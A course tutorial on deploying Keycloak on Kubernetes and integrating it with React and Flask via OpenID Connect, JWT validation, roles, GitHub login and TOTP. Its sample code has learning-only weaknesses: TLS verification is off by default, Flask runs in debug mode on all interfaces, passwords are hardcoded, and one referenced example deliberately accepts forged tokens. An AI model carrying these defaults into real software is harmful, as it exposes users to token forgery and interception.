# Tutorial 12 - Identity and Access Management with Keycloak

Learn how to add professional authentication and authorization to your applications using Keycloak - an open-source Identity and Access Management solution.

## What You'll Learn

- Deploy Keycloak on Kubernetes with PostgreSQL
- Create realms, users, and roles
- Configure client applications for authentication
- Integrate Keycloak with React and Flask applications
- Implement role-based access control (RBAC)
- Add social login and multi-factor authentication

## What is Keycloak?

**Keycloak** centralizes authentication for all your applications:
- **Single Sign-On (SSO)**: Login once, access all apps
- **Social Login**: Google, GitHub, Facebook, etc.
- **Multi-Factor Authentication (MFA)**: Extra security with OTP
- **User Management**: Create and manage users in one place
- **Standard Protocols**: OAuth 2.0, OpenID Connect, SAML

**Why use it?** Instead of building authentication yourself (and getting it wrong), Keycloak provides industry-standard security out of the box.

## Prerequisites

- Completed Tutorial 6 (Kubernetes Getting Started)
- kubectl configured and connected to your cluster
- Basic understanding of web applications
- Helm, a storage class, Traefik, cert-manager, the named ClusterIssuer, and domain DNS configured
- Python dependencies installed in a virtual environment for the automation scripts (`python3 -m pip install requests`)

The chart pins Keycloak 23 and uses `start-dev` for the course exercise. Its proxy flags and health endpoints are version-specific. This is a learning deployment, not a hardened production Keycloak setup.

---

## Part 1: Quick Start - Deploy Keycloak

### Step 1: Configure Your Deployment

Edit `keycloak-chart/values.yaml` and change these values:

```yaml
# PostgreSQL Database
postgres:
  password: "CHANGE-THIS-PASSWORD-123"  # Pick a strong password

# Keycloak Admin Account
keycloak:
  adminPassword: "CHANGE-THIS-ADMIN-PASSWORD"  # Admin console password
  database:
    password: "CHANGE-THIS-PASSWORD-123"  # Must match postgres.password above

# Your Domain
domain: keycloak.ltu-m7011e-YOUR-NAME.se  # Replace YOUR-NAME
certIssuer: letsencrypt-staging          # Existing cluster issuer
```

### Step 2: Deploy Everything

```bash
cd 12-keycloak
./install.sh
```

This deploys both PostgreSQL and Keycloak in the `keycloak` namespace. It takes about 3-5 minutes.

### Step 3: Monitor the Deployment

```bash
# Watch pods starting up
kubectl get pods -n keycloak -w

# Expected output after a few minutes:
# NAME                         READY   STATUS    RESTARTS   AGE
# keycloak-xxxxxxxxxx-xxxxx    1/1     Running   0          3m
# postgres-statefulset-0       1/1     Running   0          5m
```

Press `Ctrl+C` when both pods show `Running` and `1/1` ready.

### Step 4: Access Keycloak

Open your browser to: `https://keycloak.ltu-m7011e-YOUR-NAME.se`

![Keycloak](./keycloak.png)

**Login credentials:**
- Username: `admin`
- Password: (the adminPassword you set in values.yaml)

**Note**: You'll see a certificate warning because we're using Let's Encrypt staging certificates. Click "Advanced" → "Proceed" to continue.

You now have Keycloak running.

---

## Part 2: Create Your First Realm

A **realm** is like a tenant - it manages a set of users, applications, roles, and settings. Let's create one for your project.

### Option A: Create Realm via UI

1. In Keycloak Admin Console, click the dropdown in the top-left (shows "master")
2. Click **"Create Realm"**
3. Fill in:
   - Realm name: `myapp`
   - Enabled: ON
4. Click **"Create"**

![Realm](./realm.png)

### Option B: Create Realm Automatically (via API)

Want to automate everything? Use the realm creation scripts!

**Bash version:**
```bash
# Edit the script to set your credentials
nano create-realm.sh

# Run it
./create-realm.sh
```

**Python version:**
```bash
# Edit the script to set your credentials
nano create-realm.py

# Run it
python3 create-realm.py
```

The scripts will:
- Create the realm `myapp`
- Enable login with email
- Enable password reset
- Enable brute force protection
- Configure sensible defaults

**Note**: All automation scripts have an `INSECURE` flag at the top that controls SSL certificate verification. Set to `true` for staging certificates (default), or `false` when using production Let's Encrypt certificates.

### Step 2: Create a Test User

1. Click **"Users"** in the left sidebar
2. Click **"Add user"**
3. Fill in:
   - Username: `testuser`
   - Email: `test@example.com`
   - First name: `Test`
   - Last name: `User`
   - Email verified: ON
   - Enabled: ON
4. Click **"Create"**

![User](./user.png)

### Step 3: Set User Password

1. In the user details page, click the **"Credentials"** tab
2. Click **"Set password"**
3. Enter password: `testpass123`
4. Temporary: **OFF** (so password doesn't need to be changed on first login)
5. Click **"Save"** and confirm

### Step 4: Test Login

Open a new browser (incognito/private mode) and go to:
```
https://keycloak.ltu-m7011e-YOUR-NAME.se/realms/myapp/account
```

Login with:
- Username: `testuser`
- Password: `testpass123`

You should see the user account management page!

### Alternative: Create Users Automatically (via API)

Don't want to click through the UI? You can automate user creation using scripts!

We've included ready-to-use scripts: `create-user.sh` (bash) and `create-user.py` (Python).

**Configure the scripts** by editing the variables at the top:
- `KEYCLOAK_URL`: Your Keycloak domain
- `REALM`: The realm name you created
- `ADMIN_USER` and `ADMIN_PASSWORD`: Your admin credentials
- User details (username, email, name, password)

**Bash version** (`create-user.sh`):

```bash
#!/bin/bash

# Configuration
KEYCLOAK_URL="https://keycloak.ltu-m7011e-YOUR-NAME.se"
REALM="myapp"
ADMIN_USER="admin"
ADMIN_PASSWORD="your-admin-password"

# Get admin access token
echo "Getting admin token..."
TOKEN=$(curl -s -X POST "$KEYCLOAK_URL/realms/master/protocol/openid-connect/token" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=$ADMIN_USER" \
  -d "password=$ADMIN_PASSWORD" \
  -d "grant_type=password" \
  -d "client_id=admin-cli" \
  | grep -o '"access_token":"[^"]*' | cut -d'"' -f4)

if [ -z "$TOKEN" ]; then
  echo "Failed to get admin token. Check your credentials."
  exit 1
fi

echo "Creating user..."

# Create user
USER_ID=$(curl -s -X POST "$KEYCLOAK_URL/admin/realms/$REALM/users" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "username": "testuser",
    "email": "test@example.com",
    "firstName": "Test",
    "lastName": "User",
    "enabled": true,
    "emailVerified": true
  }' -i | grep -i location | sed 's/.*\///')

if [ -z "$USER_ID" ]; then
  echo "Failed to create user. User may already exist."
  exit 1
fi

echo "User created with ID: $USER_ID"

# Set password
echo "Setting password..."
curl -s -X PUT "$KEYCLOAK_URL/admin/realms/$REALM/users/$USER_ID/reset-password" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "type": "password",
    "value": "testpass123",
    "temporary": false
  }'

echo "User created successfully!"
echo "Username: testuser"
echo "Password: testpass123"
```

**Run it:**
```bash
# Edit the script first to set your Keycloak URL and credentials
nano create-user.sh

# Run it
./create-user.sh
```

**Python version** (`create-user.py`):

```python
#!/usr/bin/env python3
import requests
import sys

# Configuration
KEYCLOAK_URL = "https://keycloak.ltu-m7011e-YOUR-NAME.se"
REALM = "myapp"
ADMIN_USER = "admin"
ADMIN_PASSWORD = "your-admin-password"

def get_admin_token():
    """Get admin access token"""
    url = f"{KEYCLOAK_URL}/realms/master/protocol/openid-connect/token"
    data = {
        "username": ADMIN_USER,
        "password": ADMIN_PASSWORD,
        "grant_type": "password",
        "client_id": "admin-cli"
    }
    response = requests.post(url, data=data)
    if response.status_code != 200:
        print(f"Failed to get token: {response.text}")
        sys.exit(1)
    return response.json()["access_token"]

def create_user(token, username, email, first_name, last_name, password):
    """Create a new user"""
    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json"
    }

    # Create user
    user_data = {
        "username": username,
        "email": email,
        "firstName": first_name,
        "lastName": last_name,
        "enabled": True,
        "emailVerified": True
    }

    url = f"{KEYCLOAK_URL}/admin/realms/{REALM}/users"
    response = requests.post(url, json=user_data, headers=headers)

    if response.status_code == 201:
        # Get user ID from Location header
        user_id = response.headers["Location"].split("/")[-1]
        print(f"User created with ID: {user_id}")

        # Set password
        password_data = {
            "type": "password",
            "value": password,
            "temporary": False
        }
        pwd_url = f"{KEYCLOAK_URL}/admin/realms/{REALM}/users/{user_id}/reset-password"
        pwd_response = requests.put(pwd_url, json=password_data, headers=headers)

        if pwd_response.status_code == 204:
            print(f"Password set successfully!")
            return user_id
        else:
            print(f"Failed to set password: {pwd_response.text}")
    elif response.status_code == 409:
        print(f"User '{username}' already exists")
    else:
        print(f"Failed to create user: {response.text}")
        sys.exit(1)

if __name__ == "__main__":
    print("Getting admin token...")
    token = get_admin_token()

    print("Creating user...")
    create_user(
        token=token,
        username="testuser",
        email="test@example.com",
        first_name="Test",
        last_name="User",
        password="testpass123"
    )

    print("\nUser created successfully!")
    print("Username: testuser")
    print("Password: testpass123")
```

**Run it:**
```bash
# Edit the script first to set your Keycloak URL and credentials
nano create-user.py

# Run it
python3 create-user.py
```

**Why automate?**
- Create multiple test users quickly
- Set up demo environments automatically
- Integrate with CI/CD pipelines
- Bulk import users from existing systems

---

## Part 3: Create a Client Application

A **client** is an application that uses Keycloak for authentication (like your React app or Flask API).

![Client](./client.png)

### Option A: Create Client via UI

#### Step 1: Create a Public Client (for Frontend Apps)

1. Click **"Clients"** in left sidebar
2. Click **"Create client"**
3. **General Settings:**
   - Client type: `OpenID Connect`
   - Client ID: `my-frontend-app`
4. Click **"Next"**
5. **Capability config:**
   - Client authentication: **OFF** (public client - can't keep secrets)
   - Standard flow: **ON** (enables redirect-based login)
   - Direct access grants: **OFF** (the React app uses Authorization Code with PKCE)
6. Click **"Next"**
7. **Login settings:**
   - Root URL: `http://localhost:3000` (your frontend dev server)
   - Valid redirect URIs: `http://localhost:3000/*`
   - Valid post logout redirect URIs: `http://localhost:3000/*`
   - Web origins: `http://localhost:3000` (enables CORS)
8. Click **"Save"**
9. In the client's advanced settings, set the PKCE code challenge method to **S256**.
10. Under **Client scopes**, open the client's dedicated scope and add an **Audience** mapper. Set **Included Custom Audience** to `todo-api`, **Add to access token** ON, and **Add to ID token** OFF. The Flask API validates this audience. See [Keycloak audience configuration](https://www.keycloak.org/docs/latest/server_admin/index.html#_audience).

**What did we just do?** We told Keycloak that an application running on `localhost:3000` is allowed to:
- Redirect users to Keycloak for login
- Receive authentication tokens
- Make CORS requests from the browser

### Option B: Create Client Automatically (via API)

Automate client creation with scripts!

**Configure the script** by editing variables at the top:
- `CLIENT_ID`: Your application's client ID
- `CLIENT_NAME`: Display name
- `CLIENT_TYPE`: `"public"` for frontend, `"confidential"` for backend
- `FRONTEND_URLS`: List of all URLs where your frontend can be accessed

**Important**: The `FRONTEND_URLS` list must include **all URLs** you'll use to access your frontend. OAuth requires exact matches for redirect URIs.

Example configuration in `create-client.py`:
```python
FRONTEND_URLS = [
    "http://localhost:3000",
    "http://127.0.0.1:3000",
]
```

For production deployments with a domain, add your production URL:
```python
FRONTEND_URLS = [
    "https://myapp.ltu-m7011e-yourname.se",
]
```

**Bash version:**
```bash
# Edit configuration
nano create-client.sh

# Create a public client (frontend)
./create-client.sh

# For a confidential client (backend API), edit CLIENT_TYPE="confidential" first
```

**Python version:**
```bash
# Edit configuration
nano create-client.py

# Run it
python3 create-client.py
```

The script will:
- Create the client with proper redirect URIs
- Configure CORS settings, PKCE, logout redirects, and the `todo-api` audience mapper
- For confidential clients: retrieve and display the client secret

**Note**: Keep client secrets out of browser code and Git. Administrators can retrieve or rotate confidential-client secrets in Keycloak.

---

## Part 4: Integrate with a React Application

Now let's connect a React app to use Keycloak for login.

This section illustrates the adapter in a React app. For the Vite project from Tutorial 9 use `src/App.jsx`, `npm run dev`, and its actual port (usually 5173) in Keycloak redirect URIs and Web Origins. The three included examples use Create React App on port 3000. Run one example at a time because they share ports 3000 and 5001.

> 💡 **Quick Start:** Want to see a working example first? Check out `example-part-1-todo-basic/` - run `./start-frontend.sh` to see it in action, then come back here to understand how it works.

| Example | Purpose |
| --- | --- |
| [1: Basic](./example-part-1-todo-basic/) | Login and todo UI; deliberately decodes tokens without checking signatures. Learning only: forged tokens are accepted. |
| [2: Secure](./example-part-2-todo-secure/) | Verifies signatures, issuer, audience, and expiry. Every user manages only their own todos, regardless of roles. |
| [3: RBAC](./example-part-3-todo-rbac/) | Adds an `admin` realm role that can view and manage everyone's todos. |

### ⚙️ Configuration Required

Before running the examples, you **MUST** update the Keycloak URL to match your deployment:

**Frontend** - Edit `frontend/src/keycloak-config.js` in each example:
```javascript
export const keycloakConfig = {
  url: 'https://keycloak.ltu-m7011e-YOUR-NAME.se',  // ← Change YOUR-NAME
  realm: 'myapp',
  clientId: 'my-frontend-app'
};
```

**Backend** (examples 2 and 3) - Set `KEYCLOAK_URL` in the terminal that starts the backend, or edit its default in `backend/app.py`:
```bash
export KEYCLOAK_URL="https://keycloak.ltu-m7011e-YOUR-NAME.se"
```

The backend defaults to realm `myapp` and API audience `todo-api`; set `KEYCLOAK_REALM` and `KEYCLOAK_AUDIENCE` to override them. Its `INSECURE=true` default accommodates the staging certificate; use `INSECURE=false` with trusted TLS.

**⚠️ Common Error**: If you see `Failed to resolve 'keycloak.ltu-m7011e-your-name.se'`, you forgot to update the URL!

---

### Install Keycloak JavaScript Library

```bash
npm install keycloak-js
```

### Create Keycloak Configuration

Create `src/keycloak.js`:

```javascript
import Keycloak from 'keycloak-js';

const keycloak = new Keycloak({
  url: 'https://keycloak.ltu-m7011e-YOUR-NAME.se',  // Your Keycloak URL
  realm: 'myapp',                                    // The realm you created
  clientId: 'my-frontend-app'                        // The client you created
});

export const initializeKeycloak = (() => {
  let promise;
  return () => promise ||= keycloak.init({
    onLoad: 'login-required',
    checkLoginIframe: false,
    pkceMethod: 'S256'
  });
})();

export default keycloak;
```

### Initialize Keycloak in Your App

Update `src/App.js`:

```javascript
import React, { useState, useEffect } from 'react';
import keycloak, { initializeKeycloak } from './keycloak';

function App() {
  const [authenticated, setAuthenticated] = useState(false);
  const [user, setUser] = useState(null);

  useEffect(() => {
    // Initialize Keycloak
    // Share initialization across React StrictMode effect runs.
    initializeKeycloak().then(authenticated => {
      setAuthenticated(authenticated);

      if (authenticated) {
        // Load user profile
        keycloak.loadUserProfile().then(profile => {
          setUser(profile);
        });
      }
    });
  }, []);

  const logout = () => {
    keycloak.logout();
  };

  if (!authenticated) {
    return <div>Loading...</div>;
  }

  return (
    <div>
      <h1>Welcome, {user?.firstName} {user?.lastName}!</h1>
      <p>Email: {user?.email}</p>
      <p>Username: {user?.username}</p>

      <h2>Your Access Token</h2>
      <pre style={{ fontSize: '10px', overflow: 'auto' }}>
        {keycloak.token}
      </pre>

      <button onClick={logout}>Logout</button>
    </div>
  );
}

export default App;
```

### Run Your App

**Using the example (recommended):**
```bash
# See the working example first!
cd example-part-1-todo-basic

# Terminal 1: Start backend
./start-backend.sh

# Terminal 2: Start frontend
./start-frontend.sh
```

**Or manually if building from scratch:**
```bash
# Terminal 1: Start backend
cd backend
pip install -r requirements.txt
python3 app.py

# Terminal 2: Start frontend
cd frontend
npm install
npm start
```

Open `http://localhost:3000` - you'll be redirected to Keycloak's login page. Login with your Keycloak user and you'll be redirected back to your app!

![Login](./login.png)

![App](./todoapp.png)
---

## Part 5: Protect a Flask Backend API

Now let's protect your backend API by validating JWT tokens from Keycloak.

> 💡 **Quick Start:** Want to see a working example first? Check out `example-part-2-todo-secure/` - run `./start-backend.sh` and `./start-frontend.sh` to see API protection in action, then come back here to understand how it works.

### Install Dependencies

**IMPORTANT**: Only install `PyJWT` (not the old `jwt` package, as they conflict!)

```bash
pip install flask flask-cors pyjwt cryptography requests urllib3
```

Or use requirements.txt:
```txt
Flask==3.0.0
flask-cors==4.0.0
PyJWT==2.8.0
cryptography==41.0.7
requests==2.31.0
urllib3==2.0.7
```

Then install:
```bash
pip install -r requirements.txt
```

### Create Flask App with JWT Validation

The snippets in this section build a minimal API at `/api/public` and `/api/protected`. The included todo examples provide CRUD endpoints at `/api/todos` and can be run directly with their start scripts.

Create `app.py`:

```python
from flask import Flask, request, jsonify
from flask_cors import CORS
import jwt
import os
import time
import requests
import urllib3
from functools import wraps
from datetime import datetime

app = Flask(__name__)

# Configure CORS to allow requests from React frontend
CORS(app, resources={
    r"/api/*": {
        "origins": [
            "http://localhost:3000",
            "http://127.0.0.1:3000",
            "http://localhost:5173"
        ] if not os.getenv("FRONTEND_URL") else [os.environ["FRONTEND_URL"]],
        "methods": ["GET", "POST", "PUT", "DELETE", "OPTIONS"],
        "allow_headers": ["Content-Type", "Authorization"]
    }
})

# SSL/TLS Configuration
# Use INSECURE=True for staging/self-signed certificates
# Use INSECURE=False for production Let's Encrypt certificates
INSECURE = os.getenv("INSECURE", "true").lower() == "true"

if INSECURE:
    # Disable SSL warnings when using self-signed certificates
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Keycloak configuration - UPDATE THESE VALUES
KEYCLOAK_URL = os.getenv("KEYCLOAK_URL", "https://keycloak.ltu-m7011e-YOUR-NAME.se").rstrip("/")  # Change to your Keycloak URL
REALM = os.getenv("KEYCLOAK_REALM", "myapp")  # Change this to match your realm
CLIENT_ID = os.getenv("KEYCLOAK_CLIENT_ID", "my-frontend-app")
API_AUDIENCE = os.getenv("KEYCLOAK_AUDIENCE", "todo-api")  # Audience mapper on the frontend client

# Keycloak endpoints
KEYCLOAK_ISSUER = f"{KEYCLOAK_URL}/realms/{REALM}"
KEYCLOAK_CERTS_URL = f"{KEYCLOAK_ISSUER}/protocol/openid-connect/certs"

# Cache public keys for five minutes; refresh once on an unknown signing key.
public_keys_cache = None
public_keys_fetched_at = 0.0

# In-memory storage for todos
# In production, use a proper database (PostgreSQL, etc.)
todos = []
todo_id_counter = 1


def get_public_keys(force_refresh=False):
    """
    Fetch public keys from Keycloak for JWT verification
    Keycloak uses these keys to sign JWTs - we use them to verify signatures
    """
    global public_keys_cache, public_keys_fetched_at

    if force_refresh or public_keys_cache is None or time.monotonic() - public_keys_fetched_at > 300:
        try:
            response = requests.get(KEYCLOAK_CERTS_URL, timeout=10, verify=not INSECURE)
            response.raise_for_status()
            public_keys_cache = response.json()
            public_keys_fetched_at = time.monotonic()
            print(f"✓ Fetched public keys from Keycloak")
        except Exception as e:
            print(f"✗ Error fetching public keys: {e}")
            raise Exception("Failed to fetch Keycloak public keys")

    return public_keys_cache


def verify_token(token):
    """
    Verify JWT token from Keycloak
    Steps:
    1. Decode token header to get key ID (kid)
    2. Find matching public key from Keycloak
    3. Verify signature using public key
    4. Validate claims (expiration, issuer, audience)
    5. Return decoded token with user information
    """
    try:
        # Get public keys from Keycloak
        keys = get_public_keys()

        # Decode token header (without verification) to get key ID
        unverified_header = jwt.get_unverified_header(token)
        key_id = unverified_header.get('kid')

        if not key_id:
            raise Exception("Token missing key ID (kid)")

        # Refresh JWKS once for an unknown kid so key rotation is supported.
        key = next((key for key in keys['keys'] if key['kid'] == key_id), None)
        if key is None:
            keys = get_public_keys(force_refresh=True)
            key = next((key for key in keys['keys'] if key['kid'] == key_id), None)
        if key is None:
            raise jwt.InvalidTokenError("Unknown signing key")
        public_key = jwt.algorithms.RSAAlgorithm.from_jwk(key)

        # Verify and decode the token
        # This validates:
        # - Signature (ensures token was signed by Keycloak)
        # - Expiration (exp claim)
        # - Not before (nbf claim)
        # - Issuer (iss claim)
        # - Audience (aud claim)
        decoded_token = jwt.decode(
            token,
            public_key,
            algorithms=['RS256'],
            audience=API_AUDIENCE,  # Audience mapper configured on the frontend client
            issuer=KEYCLOAK_ISSUER,
            options={
                'require': ['exp', 'iss', 'sub', 'aud'],
                'verify_signature': True,
                'verify_exp': True,
                'verify_nbf': True,
                'verify_iss': True,
                'verify_aud': True
            }
        )

        if not isinstance(decoded_token.get("sub"), str) or not decoded_token["sub"]:
            raise jwt.InvalidTokenError("Token requires a non-empty subject")

        return decoded_token

    except jwt.ExpiredSignatureError:
        raise Exception("Token has expired")
    except jwt.InvalidTokenError as e:
        raise Exception(f"Invalid token: {str(e)}")
    except Exception as e:
        raise Exception(f"Token verification failed: {str(e)}")


def require_auth(f):
    """
    Decorator to require authentication for endpoints
    Validates JWT token from Authorization header
    Adds decoded token to request.user for use in endpoint
    """
    @wraps(f)
    def decorated_function(*args, **kwargs):
        # Get Authorization header
        auth_header = request.headers.get('Authorization')

        if not auth_header:
            return jsonify({'error': 'No authorization header provided'}), 401

        # Extract token from "Bearer <token>" format
        parts = auth_header.split()
        if len(parts) != 2 or parts[0].lower() != 'bearer':
            return jsonify({'error': 'Invalid authorization header format. Use: Bearer <token>'}), 401

        token = parts[1]

        try:
            # Verify token and extract user information
            decoded_token = verify_token(token)

            # Add user information to request context
            request.user = decoded_token

        except Exception as e:
            print(f"Authentication failed: {e}")
            return jsonify({'error': str(e)}), 401

        return f(*args, **kwargs)

    return decorated_function


@app.route('/api/public')
def public():
    return jsonify({'message': 'This is public data'})


@app.route('/api/protected')
@require_auth
def protected():
    return jsonify({
        'message': 'This is protected data',
        'user': request.user.get('preferred_username', request.user['sub']),
        'email': request.user.get('email', 'N/A')
    })


if __name__ == '__main__':
    app.run(debug=True, port=5001, host='0.0.0.0')

```

### Test Your Protected API

**Using the example (recommended):**
```bash
# See the working example with full todo app!
cd example-part-2-todo-secure

# Terminal 1: Start backend (with signature verification)
./start-backend.sh

# Terminal 2: Start frontend
./start-frontend.sh
```

**Or manually if building from scratch:**
```bash
# Start Flask backend
cd backend
pip install -r requirements.txt
python3 app.py
```

Now let's call the protected API from React. We'll organize the code properly:

#### Step 1: Create or Update API Helper File

**Building the minimal app from the snippets?** Create `src/api.js` alongside the `keycloak.js` and `App.js` from Part 4:

**Already using the complete todo examples?** You already have `src/api.js` with `getTodos`, `createTodo`, etc. Just add the `callProtectedAPI` function to it.

**Complete `src/api.js` code:**

```javascript
// src/api.js
const API_BASE_URL = 'http://localhost:5001/api';

// Helper function to make authenticated requests
const authFetch = async (url, token, options = {}) => {
  const response = await fetch(url, {
    ...options,
    headers: {
      ...options.headers,
      'Authorization': `Bearer ${token}`,
      'Content-Type': 'application/json'
    }
  });

  if (!response.ok) {
    const error = await response.json().catch(() => ({ error: 'Request failed' }));
    throw new Error(error.error || `HTTP ${response.status}`);
  }

  return response.json();
};

// ← ADD THIS if you already have api.js, OR include it in your new file
// Call the protected endpoint to test JWT authentication
export const callProtectedAPI = async (token) => {
  return authFetch(`${API_BASE_URL}/protected`, token);
};

// Your existing functions (getTodos, createTodo, etc.) stay here if you have them
```

#### Step 2: Update App.js to Use the API

Your existing `src/App.js` should already have the basic Keycloak setup. **Add these specific changes**:

**Changes to make:**

1. **Add the new import** (at the top):
```javascript
import { callProtectedAPI } from './api';  // ← ADD THIS LINE
```

2. **Add new state variables** (inside the `App` function, after existing state):
```javascript
const [apiResponse, setApiResponse] = useState(null);  // ← ADD THIS
const [error, setError] = useState(null);               // ← ADD THIS
```

3. **Add the API call handler function** (after the `useEffect`, before the `return`):
```javascript
// ← ADD THIS ENTIRE FUNCTION
const handleCallAPI = async () => {
  try {
    setError(null);

    // Refresh token if needed (within 30 seconds of expiry)
    await keycloak.updateToken(30);

    // Call the protected API with the current token
    const data = await callProtectedAPI(keycloak.token);

    setApiResponse(data);
    console.log('API response:', data);
  } catch (err) {
    console.error('API call failed:', err);
    setError(err.message);
  }
};
```

4. **Add the button and response display** (inside the `return` statement, after the user info):
```javascript
{/* ← ADD THIS BUTTON */}
<button onClick={handleCallAPI}>
  Call Protected API
</button>

{/* ← ADD THIS: Display API response */}
{apiResponse && (
  <div style={{ marginTop: '20px', padding: '10px', background: '#e8f5e9' }}>
    <h3>API Response:</h3>
    <pre>{JSON.stringify(apiResponse, null, 2)}</pre>
  </div>
)}

{/* ← ADD THIS: Display errors */}
{error && (
  <div style={{ marginTop: '20px', padding: '10px', background: '#ffebee', color: 'red' }}>
    <strong>Error:</strong> {error}
  </div>
)}
```

**Complete example of the updated App.js:**

<details>
<summary>Click to see full App.js code</summary>

```javascript
import React, { useState, useEffect } from 'react';
import keycloak, { initializeKeycloak } from './keycloak';
import { callProtectedAPI } from './api';  // ← NEW IMPORT

function App() {
  // Existing state
  const [authenticated, setAuthenticated] = useState(false);
  const [user, setUser] = useState(null);

  // NEW: State for API testing
  const [apiResponse, setApiResponse] = useState(null);
  const [error, setError] = useState(null);

  // Reuse the shared initialization promise from Part 4.
  useEffect(() => {
    initializeKeycloak().then(authenticated => {
      setAuthenticated(authenticated);

      if (authenticated) {
        keycloak.loadUserProfile().then(profile => {
          setUser(profile);
        });
      }
    });
  }, []);

  // NEW: Function to call the protected API
  const handleCallAPI = async () => {
    try {
      setError(null);
      await keycloak.updateToken(30);
      const data = await callProtectedAPI(keycloak.token);
      setApiResponse(data);
      console.log('API response:', data);
    } catch (err) {
      console.error('API call failed:', err);
      setError(err.message);
    }
  };

  if (!authenticated) {
    return <div>Loading...</div>;
  }

  return (
    <div>
      <h1>Welcome, {user?.firstName} {user?.lastName}!</h1>
      <p>Email: {user?.email}</p>

      {/* NEW: Button to test API */}
      <button onClick={handleCallAPI}>
        Call Protected API
      </button>

      {/* NEW: Display API response */}
      {apiResponse && (
        <div style={{ marginTop: '20px', padding: '10px', background: '#e8f5e9' }}>
          <h3>API Response:</h3>
          <pre>{JSON.stringify(apiResponse, null, 2)}</pre>
        </div>
      )}

      {/* NEW: Display errors */}
      {error && (
        <div style={{ marginTop: '20px', padding: '10px', background: '#ffebee', color: 'red' }}>
          <strong>Error:</strong> {error}
        </div>
      )}

      {/* Existing logout button */}
      <button onClick={() => keycloak.logout()}>Logout</button>
    </div>
  );
}

export default App;
```
</details>

#### How onClick Works:

1. **Button Definition**: `<button onClick={handleCallAPI}>`
   - When clicked, React calls the `handleCallAPI` function

2. **handleCallAPI Function**:
   ```javascript
   const handleCallAPI = async () => {
     await keycloak.updateToken(30);  // Refresh token if needed
     const data = await callProtectedAPI(keycloak.token);  // Call API
     setApiResponse(data);  // Update state to display response
   }
   ```

3. **Token Flow**:
   - Get current token: `keycloak.token`
   - Add to Authorization header: `'Authorization': Bearer ${token}'`
   - Flask backend receives and verifies the token
   - Returns protected data or 401 error

4. **State Updates**:
   - `setApiResponse(data)` triggers re-render
   - Response appears in the UI automatically

**What's happening?**
1. User clicks "Call Protected API" button
2. React calls `handleCallAPI()` function
3. Token is refreshed if expiring soon
4. API call is made with token in Authorization header
5. Flask verifies token using Keycloak's public keys
6. If valid, Flask returns protected data
7. React displays the response in the UI
8. If invalid/expired, error is shown

---

## Part 6: Add Roles and Authorization

Let's add role-based access control to limit what users can do. Run `example-part-3-todo-rbac/` for the complete implementation: users manage their own todos, and the `admin` realm role can view, toggle, and delete everyone's todos. The `editor` and `viewer` roles below illustrate additional checks you can add; the included app treats both as ordinary users.

### Step 1: Create Roles

1. In Keycloak, go to **"Realm roles"**
2. Click **"Create role"**
3. Create these roles:
   - Role name: `admin` → Description: `Administrator`
   - Role name: `editor` → Description: `Can edit content`
   - Role name: `viewer` → Description: `Read-only access`

### Step 2: Assign Roles to User

1. Go to **"Users"** → Click on `testuser`
2. Go to **"Role mapping"** tab
3. Click **"Assign role"**
4. Select `editor` role
5. Click **"Assign"**

### Step 3: Check Roles in Your Application

After changing roles, log out and log back in to obtain a new access token. In React:

```javascript
// Check if user has a specific role
const hasRole = (role) => {
  return keycloak.hasRealmRole(role);
};

// Conditionally render based on role
{hasRole('admin') && (
  <button>Admin Only Feature</button>
)}

{hasRole('editor') && (
  <button>Edit Content</button>
)}
```

In Flask:

```python
@app.route('/api/admin-only')
@require_auth
def admin_only():
    # Get roles from token
    roles = request.user.get('realm_access', {}).get('roles', [])

    if 'admin' not in roles:
        return jsonify({'error': 'Admin access required'}), 403

    return jsonify({'message': 'Admin data'})
```

---

## Part 7: Add Social Login (GitHub Example)

Let users login with their GitHub account.

### Step 1: Create GitHub OAuth App

1. Go to GitHub → Settings → Developer settings → OAuth Apps
2. Click **"New OAuth App"**
3. Fill in:
   - Application name: `My Keycloak App`
   - Homepage URL: `https://keycloak.ltu-m7011e-YOUR-NAME.se`
   - Authorization callback URL: `https://keycloak.ltu-m7011e-YOUR-NAME.se/realms/myapp/broker/github/endpoint`
4. Click **"Register application"**
5. Copy the **Client ID** and **Client Secret**

### Step 2: Configure in Keycloak

1. In Keycloak, go to **"Identity providers"**
2. Click **"Add provider"** → Select **"GitHub"**
3. Fill in:
   - Alias: `github`
   - Display name: `GitHub`
   - Client ID: (paste from GitHub)
   - Client Secret: (paste from GitHub)
4. Click **"Add"**

### Step 3: Test Social Login

1. Logout from your app
2. Go to login page - you'll now see a **"GitHub"** button
3. Click it to authenticate with GitHub!

---

## Part 8: Enable Multi-Factor Authentication

Add extra security with Time-based One-Time Passwords (TOTP).

### Step 1: Configure OTP for User

1. Login to account console: `https://keycloak.ltu-m7011e-YOUR-NAME.se/realms/myapp/account`
2. Go to **"Account Security"** → **"Signing in"**
3. Click **"Set up"** under **"Mobile Authenticator"**
4. Scan the QR code with Google Authenticator or Authy app
5. Enter the 6-digit code to verify
6. If recovery codes are enabled for your realm, generate and store them separately; TOTP setup alone does not always provide recovery codes.

### Step 2: Test MFA

1. Logout and login again
2. After entering your password, you'll be prompted for the 6-digit OTP code
3. Open your authenticator app and enter the code

---

## Part 9: Complete Example Application

Want to see everything working together? Use `example-part-3-todo-rbac/` after trying examples 1 and 2 above.

### What's Included

- **Full React frontend** with Keycloak authentication
- **Flask backend** with JWT token validation
- **Role-based access control** (admins see all todos, users see only their own)
- **Automatic token refresh**
- **Protected API endpoints**

### Quick Start

```bash
cd example-part-3-todo-rbac

# Start backend (Terminal 1)
./start-backend.sh

# Start frontend (Terminal 2)
./start-frontend.sh
```

Before starting, update `backend/app.py` (or set `KEYCLOAK_URL`, `KEYCLOAK_REALM`, and `KEYCLOAK_AUDIENCE`) and `frontend/src/keycloak-config.js` to match your deployment. Create the client with the `todo-api` audience mapper above. Backend: `http://localhost:5001`; frontend: `http://localhost:3000`. The frontend refreshes its access token before API requests and periodically while open. The sample stores todos in memory, so use one backend replica until you add shared storage.

---

To run the backend regression tests without a live Keycloak server, install `pytest` alongside the example 3 backend dependencies and run `python -m pytest tests/` from `12-keycloak/`. The tests cover all three examples, including the intentional signature bypass in example 1 and the admin-role difference between examples 2 and 3.

## Part 10: Troubleshooting

### Keycloak Won't Start

```bash
# Check pod status
kubectl describe pod -n keycloak -l app=keycloak

# Check logs
kubectl logs -n keycloak -l app=keycloak

